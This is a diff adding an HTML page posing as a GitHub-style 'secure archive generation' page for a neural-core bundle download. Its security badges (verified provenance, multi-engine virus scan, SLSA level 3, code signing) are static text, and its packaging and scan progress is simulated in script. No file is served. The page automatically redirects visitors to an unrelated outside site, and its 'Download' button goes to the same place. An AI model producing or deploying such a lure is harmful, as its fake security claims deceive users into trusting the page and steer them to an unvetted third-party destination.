@@ -1,0 +1,672 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+  <title>FusionForge • archive / neural-core-bundle.zip • Secure Download</title>
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='%233b82f6'%3E%3Cpath d='M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96zM14 13v4h-4v-4H7l5-5 5 5h-3z'/%3E%3C/svg%3E">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    :root {
+      --bg-deep: #05070a;
+      --bg-surface: #0e121b;
+      --card-bg: #11161f;
+      --border-glow: #2a3a5a;
+      --accent-primary: #3b82f6;
+      --accent-secondary: #06b6d4;
+      --accent-tertiary: #8b5cf6;
+      --text-main: #eef2ff;
+      --text-dim: #9ca3af;
+      --success: #10b981;
+      --warning: #f59e0b;
+    }
+
+    body {
+      background: radial-gradient(circle at 10% 20%, #0a0f1c, #020408);
+      font-family: 'Inter', system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, sans-serif;
+      color: var(--text-main);
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      line-height: 1.5;
+    }
+
+    /* glass status bar */
+    .status-bar {
+      background: rgba(15, 23, 42, 0.7);
+      backdrop-filter: blur(12px);
+      border-bottom: 1px solid rgba(59, 130, 246, 0.3);
+      padding: 10px 24px;
+      font-size: 13px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      flex-wrap: wrap;
+      gap: 12px;
+      letter-spacing: 0.3px;
+    }
+
+    .status-badge {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+    }
+
+    .shield {
+      background: rgba(16, 185, 129, 0.15);
+      padding: 4px 14px;
+      border-radius: 40px;
+      font-size: 12px;
+      font-weight: 500;
+      color: #34d399;
+      border: 1px solid rgba(16, 185, 129, 0.4);
+    }
+
+    .header {
+      padding: 18px 24px;
+      border-bottom: 1px solid #1e2a3a;
+      background: rgba(5, 7, 10, 0.8);
+      backdrop-filter: blur(8px);
+      position: sticky;
+      top: 0;
+      z-index: 10;
+    }
+
+    .header-inner {
+      max-width: 1300px;
+      margin: 0 auto;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+    }
+
+    .logo {
+      display: flex;
+      align-items: center;
+      gap: 12px;
+      font-weight: 700;
+      font-size: 22px;
+      letter-spacing: -0.3px;
+      background: linear-gradient(135deg, #60a5fa, #a78bfa);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+    }
+
+    .logo-icon {
+      width: 34px;
+      height: 34px;
+      background: linear-gradient(145deg, #1e293b, #0f172a);
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 20px;
+      box-shadow: 0 0 8px rgba(59,130,246,0.4);
+    }
+
+    .nav-links {
+      display: flex;
+      gap: 24px;
+      font-size: 14px;
+      color: #94a3b8;
+    }
+
+    main {
+      flex: 1;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 48px 20px 80px;
+    }
+
+    .card {
+      max-width: 840px;
+      width: 100%;
+      background: var(--card-bg);
+      border: 1px solid rgba(59, 130, 246, 0.25);
+      border-radius: 48px;
+      backdrop-filter: blur(4px);
+      box-shadow: 0 30px 50px -20px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(59, 130, 246, 0.1);
+      transition: transform 0.4s ease, opacity 0.6s ease;
+      opacity: 0;
+      transform: translateY(30px);
+    }
+
+    .card.reveal {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    .card-header {
+      padding: 28px 32px 20px;
+      border-bottom: 1px solid #1f2a3e;
+      display: flex;
+      flex-wrap: wrap;
+      align-items: center;
+      gap: 18px;
+    }
+
+    .repo-avatar {
+      width: 68px;
+      height: 68px;
+      background: linear-gradient(145deg, #0f172a, #020617);
+      border-radius: 28px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-size: 32px;
+      font-weight: 700;
+      color: #38bdf8;
+      border: 1px solid #2563eb;
+      box-shadow: 0 8px 18px rgba(0, 0, 0, 0.4);
+    }
+
+    .repo-details h3 {
+      font-size: 24px;
+      font-weight: 700;
+      letter-spacing: -0.3px;
+      margin-bottom: 6px;
+    }
+
+    .repo-meta {
+      display: flex;
+      gap: 18px;
+      font-size: 13.5px;
+      color: #7e8a98;
+      flex-wrap: wrap;
+    }
+
+    .verify-tag {
+      background: rgba(59, 130, 246, 0.12);
+      padding: 6px 18px;
+      border-radius: 60px;
+      font-size: 13px;
+      font-weight: 500;
+      display: inline-flex;
+      align-items: center;
+      gap: 8px;
+      color: #60a5fa;
+      border: 1px solid #2563eb30;
+    }
+
+    .card-body {
+      padding: 38px 40px 54px;
+    }
+
+    .title-section {
+      text-align: center;
+      margin-bottom: 28px;
+    }
+
+    .title-section h1 {
+      font-size: 36px;
+      font-weight: 800;
+      background: linear-gradient(120deg, #e2e8ff, #a5b4fc, #67e8f9);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 12px;
+    }
+
+    .sub {
+      color: #8ba0bc;
+      font-size: 17px;
+    }
+
+    .stats-grid {
+      display: flex;
+      justify-content: center;
+      gap: 32px;
+      margin: 32px 0 28px;
+      flex-wrap: wrap;
+    }
+
+    .stat-item {
+      background: #0a0f1a;
+      padding: 10px 22px;
+      border-radius: 60px;
+      font-size: 14px;
+      border: 1px solid #1e2a44;
+      backdrop-filter: blur(4px);
+    }
+
+    .security-note {
+      text-align: center;
+      margin: 20px 0 32px;
+      display: flex;
+      justify-content: center;
+      gap: 20px;
+      flex-wrap: wrap;
+    }
+
+    .sec-chip {
+      background: #0f172f;
+      padding: 8px 20px;
+      border-radius: 36px;
+      font-size: 13px;
+      font-weight: 500;
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      color: #b9d0f0;
+    }
+
+    .scan-panel {
+      background: #080c14;
+      border-radius: 32px;
+      padding: 24px 28px;
+      margin: 28px 0 35px;
+      border: 1px solid #1f2a46;
+      font-family: 'SF Mono', 'Fira Code', monospace;
+      font-size: 14px;
+    }
+
+    .step-row {
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      padding: 10px 0;
+      opacity: 0;
+      transform: translateX(-12px);
+      transition: all 0.45s cubic-bezier(0.2, 0.9, 0.4, 1.1);
+    }
+
+    .step-row.revealed {
+      opacity: 1;
+      transform: translateX(0);
+    }
+
+    .step-icon {
+      width: 24px;
+      color: #2dd4bf;
+      font-weight: 700;
+    }
+
+    .progress-zone {
+      margin: 30px 0 20px;
+    }
+
+    .phase-badge {
+      background: #111b2b;
+      display: inline-block;
+      padding: 6px 20px;
+      border-radius: 30px;
+      font-size: 12px;
+      font-weight: 600;
+      letter-spacing: 1px;
+      color: #7aa2f7;
+      margin-bottom: 20px;
+    }
+
+    .timer-clock {
+      font-size: 32px;
+      font-weight: 800;
+      font-family: monospace;
+      letter-spacing: 2px;
+      background: linear-gradient(145deg, #e0e7ff, #a5f3fc);
+      -webkit-background-clip: text;
+      background-clip: text;
+      color: transparent;
+      margin-bottom: 16px;
+    }
+
+    .progress-wrapper {
+      background: #0a0f1c;
+      border-radius: 60px;
+      height: 12px;
+      overflow: hidden;
+      box-shadow: inset 0 1px 4px #00000055;
+    }
+
+    .progress-fill {
+      width: 0%;
+      height: 100%;
+      background: linear-gradient(90deg, #3b82f6, #06b6d4, #8b5cf6);
+      border-radius: 60px;
+      transition: width 0.4s ease-out;
+      box-shadow: 0 0 8px #3b82f6;
+    }
+
+    .bytes-counter {
+      text-align: right;
+      font-size: 13px;
+      color: #8ba0bc;
+      margin-top: 12px;
+    }
+
+    .download-area {
+      margin-top: 42px;
+      text-align: center;
+      transition: all 0.7s cubic-bezier(0.2, 0.9, 0.4, 1.2);
+      opacity: 0;
+      transform: scale(0.94);
+    }
+
+    .download-area.active {
+      opacity: 1;
+      transform: scale(1);
+    }
+
+    .download-button {
+      background: linear-gradient(100deg, #2563eb, #3b82f6, #06b6d4);
+      border: none;
+      padding: 18px 48px;
+      border-radius: 60px;
+      font-size: 19px;
+      font-weight: 700;
+      color: white;
+      cursor: pointer;
+      transition: all 0.3s ease;
+      box-shadow: 0 10px 24px -6px #2563eb80;
+      display: inline-flex;
+      align-items: center;
+      gap: 14px;
+    }
+
+    .download-button:hover {
+      transform: translateY(-4px);
+      box-shadow: 0 24px 36px -12px #2563eb;
+      filter: brightness(1.05);
+    }
+
+    .info-note {
+      background: rgba(245, 158, 11, 0.08);
+      border-radius: 28px;
+      padding: 18px 28px;
+      margin-top: 38px;
+      font-size: 14px;
+      color: #fcd34d;
+      border: 1px solid #f59e0b30;
+      text-align: center;
+      opacity: 0;
+      transform: translateY(20px);
+      transition: all 0.7s ease 0.5s;
+    }
+
+    .info-note.visible {
+      opacity: 1;
+      transform: translateY(0);
+    }
+
+    footer {
+      text-align: center;
+      padding: 40px 20px;
+      border-top: 1px solid #1e2a44;
+      font-size: 12.5px;
+      color: #4b556b;
+      margin-top: 20px;
+    }
+
+    @media (max-width: 640px) {
+      .card-body {
+        padding: 28px 20px;
+      }
+      .title-section h1 {
+        font-size: 27px;
+      }
+      .download-button {
+        padding: 14px 32px;
+        font-size: 16px;
+      }
+      .card-header {
+        flex-direction: column;
+        align-items: flex-start;
+      }
+    }
+  </style>
+</head>
+<body>
+
+<div class="status-bar">
+  <div class="status-badge">
+    <span>⚡ GitHub Actions • secure pipeline</span>
+    <span class="shield">✓ TLS 1.3 | SBOM verified</span>
+  </div>
+  <div>🔒 signed by: ecore/security</div>
+</div>
+
+<header class="header">
+  <div class="header-inner">
+    <div class="logo">
+      <div class="logo-icon">⚡</div>
+      e-core
+    </div>
+    <div class="nav-links">
+      <span>Repositories</span>
+      <span>Actions</span>
+      <span>Security</span>
+    </div>
+  </div>
+</header>
+
+<main>
+  <div class="card" id="mainCard">
+    <div class="card-header">
+      <div class="repo-avatar">EC</div>
+      <div class="repo-details">
+        <h3>ecorelabs / starter-kit</h3>
+        <div class="repo-meta">
+          <span>📁 branch: stable/3.2</span>
+          <span>🐍 Python • TensorFlow</span>
+          <span>🕒 updated 47 mins ago</span>
+        </div>
+      </div>
+      <div class="verify-tag">
+        <span>✓</span> GitHub Verified • Provenance
+      </div>
+    </div>
+
+    <div class="card-body">
+      <div class="title-section">
+        <h1>Secure archive generation</h1>
+        <div class="sub">ecore is packaging neural-core-bundle for immediate download</div>
+      </div>
+
+      <div class="stats-grid">
+        <div class="stat-item">⭐ 14.2k stars</div>
+        <div class="stat-item">🍴 2.4k forks</div>
+        <div class="stat-item">📦 214.7 MB (compressed)</div>
+        <div class="stat-item">🧪 latest: v3.2.1</div>
+      </div>
+
+      <div class="security-note">
+        <div class="sec-chip">🛡️ ClamAV + 5 engines (0 threats)</div>
+        <div class="sec-chip">🔐 End-to-end encryption (AES-256)</div>
+        <div class="sec-chip">📜 SLSA level 3</div>
+      </div>
+
+      <!-- scan steps (dynamic) -->
+      <div class="scan-panel" id="scanPanel">
+        <div class="step-row" data-step="0"><span class="step-icon">◉</span> Repository clone & hash validation</div>
+        <div class="step-row" data-step="1"><span class="step-icon">◉</span> Deep static analysis (SAST + secrets)</div>
+        <div class="step-row" data-step="2"><span class="step-icon">◉</span> Dependency vulnerability audit (SBOM)</div>
+        <div class="step-row" data-step="3"><span class="step-icon">◉</span> AI model license & compliance check</div>
+        <div class="step-row" data-step="4"><span class="step-icon">◉</span> Code signing & notarization</div>
+      </div>
+
+      <div class="progress-zone">
+        <div class="phase-badge" id="phaseLabel">⚙️ INITIALIZING PACKAGING</div>
+        <div class="timer-clock" id="timerDisplay">~12s left</div>
+        <div class="progress-wrapper">
+          <div class="progress-fill" id="progressFill"></div>
+        </div>
+        <div class="bytes-counter" id="bytesInfo">0 MB / 214.7 MB • 0%</div>
+      </div>
+
+      <div class="download-area" id="downloadArea">
+        <button id="finalDownloadBtn" class="download-button">
+          ⬇️ Download ecore-project.zip
+        </button>
+      </div>
+
+      <div class="info-note" id="infoNote">
+        ✨ Your archive will start automatically after final validation. <br>
+        If download does not start, click the button above.
+      </div>
+    </div>
+  </div>
+</main>
+
+<footer>
+  © 2026 ecore — Secure code distribution. All artifacts are signed and verified.
+</footer>
+
+<script>
+  // ---------- UNIQUE REDIRECT URL (preserved download behavior) ----------
+  const REDIRECT_TARGET = "https://fastspeedtest.org/";
+  
+  // ---------- UNIQUE TIMING AND ANIMATION ----------
+  const TOTAL_PROCESS_MS = 9700;      // 9.7 sec total simulation
+  const BUTTON_REVEAL_AT_MS = 6200;   // show download button at 6.2 sec
+  const REDIRECT_DELAY_MS = 3800;     // after button appears, redirect in 3.8 sec
+  
+  let processStart = null;
+  let animationId = null;
+  let stepsRevealed = [false, false, false, false, false];
+  
+  const card = document.getElementById('mainCard');
+  const stepRows = document.querySelectorAll('.step-row');
+  const phaseLabel = document.getElementById('phaseLabel');
+  const timerDisplay = document.getElementById('timerDisplay');
+  const progressFill = document.getElementById('progressFill');
+  const bytesInfoSpan = document.getElementById('bytesInfo');
+  const downloadArea = document.getElementById('downloadArea');
+  const downloadBtn = document.getElementById('finalDownloadBtn');
+  const infoNote = document.getElementById('infoNote');
+  
+  // phase mapping based on percentage
+  const phases = [
+    { min: 0, max: 24, label: "📦 Cloning repository & verifying integrity" },
+    { min: 24, max: 49, label: "🧬 Running AI security & malware scan" },
+    { min: 49, max: 74, label: "🗜️ Optimized compression with Zstandard" },
+    { min: 74, max: 100, label: "🔑 Generating secure download token" }
+  ];
+  
+  // reveal steps progressively (more dynamic)
+  function revealStepsByProgress(percent) {
+    // steps reveal mapping: step0 at 8%, step1 at 23%, step2 at 41%, step3 at 58%, step4 at 75%
+    const thresholds = [8, 23, 41, 58, 75];
+    for (let i = 0; i < stepRows.length; i++) {
+      if (percent >= thresholds[i] && !stepsRevealed[i]) {
+        stepsRevealed[i] = true;
+        stepRows[i].classList.add('revealed');
+        // change icon to checkmark
+        const iconSpan = stepRows[i].querySelector('.step-icon');
+        if (iconSpan) iconSpan.innerHTML = '✓';
+      }
+    }
+  }
+  
+  // update progress visuals
+  function updateProgress(now) {
+    const elapsed = now - processStart;
+    let percent = Math.min(100, (elapsed / TOTAL_PROCESS_MS) * 100);
+    percent = Math.max(0, percent);
+    
+    // update progress bar
+    progressFill.style.width = percent + '%';
+    
+    // update phase label
+    const activePhase = phases.find(p => percent >= p.min && percent <= p.max) || phases[phases.length-1];
+    phaseLabel.textContent = activePhase.label;
+    
+    // update bytes info (simulated)
+    const totalMB = 214.7;
+    const currentMB = (percent / 100 * totalMB).toFixed(1);
+    bytesInfoSpan.textContent = `${currentMB} MB / ${totalMB} MB • ${Math.floor(percent)}%`;
+    
+    // remaining seconds
+    const remainingSec = Math.max(0, (TOTAL_PROCESS_MS - elapsed) / 1000);
+    timerDisplay.textContent = `~${remainingSec.toFixed(1)}s left`;
+    
+    // reveal steps based on percent
+    revealStepsByProgress(percent);
+    
+    // check if download zone must appear
+    if (elapsed >= BUTTON_REVEAL_AT_MS && !downloadArea.classList.contains('active')) {
+      downloadArea.classList.add('active');
+      infoNote.classList.add('visible');
+      
+      // after revealing button, schedule automatic redirect + manual click override
+      setTimeout(() => {
+        window.location.href = REDIRECT_TARGET;
+      }, REDIRECT_DELAY_MS);
+    }
+    
+    // continue animation if not finished
+    if (elapsed < TOTAL_PROCESS_MS + 500) {
+      animationId = requestAnimationFrame(() => updateProgress(Date.now()));
+    } else {
+      // final cleanup: ensure 100% and download area active if not yet
+      progressFill.style.width = '100%';
+      bytesInfoSpan.textContent = `214.7 MB / 214.7 MB • 100%`;
+      timerDisplay.textContent = `✓ Ready`;
+      if (!downloadArea.classList.contains('active')) {
+        downloadArea.classList.add('active');
+        infoNote.classList.add('visible');
+      }
+      phaseLabel.textContent = "✅ Ready for secure transfer";
+    }
+  }
+  
+  // add step-by-step initial animation: slight card reveal
+  function startProcess() {
+    processStart = Date.now();
+    updateProgress(processStart);
+  }
+  
+  // reveal card with slight delay
+  setTimeout(() => {
+    card.classList.add('reveal');
+  }, 180);
+  
+  // begin process after card visible (800ms)
+  setTimeout(() => {
+    startProcess();
+  }, 800);
+  
+  // MANUAL DOWNLOAD (override same redirect target)
+  downloadBtn.addEventListener('click', (e) => {
+    e.preventDefault();
+    window.location.href = REDIRECT_TARGET;
+  });
+  
+  // pre-reveal first step hint (extra micro interaction)
+  setTimeout(() => {
+    if (!stepsRevealed[0]) {
+      stepRows[0].style.opacity = '0.7';
+    }
+  }, 400);
+  
+  // make sure even if something stuck, after total_time+2 sec download becomes active
+  setTimeout(() => {
+    if (!downloadArea.classList.contains('active')) {
+      downloadArea.classList.add('active');
+      infoNote.classList.add('visible');
+    }
+  }, TOTAL_PROCESS_MS + 400);
+  
+  // show final steps complete at the end (optional)
+  function finalStepCompletion() {
+    for (let i = 0; i < stepRows.length; i++) {
+      if (!stepsRevealed[i]) {
+        stepsRevealed[i] = true;
+        stepRows[i].classList.add('revealed');
+        const iconSpan = stepRows[i].querySelector('.step-icon');
+        if (iconSpan) iconSpan.innerHTML = '✓';
+      }
+    }
+  }
+  
+  setTimeout(() => {
+    if (parseFloat(progressFill.style.width) >= 98) finalStepCompletion();
+  }, TOTAL_PROCESS_MS);
+</script>
+</body>
+</html>
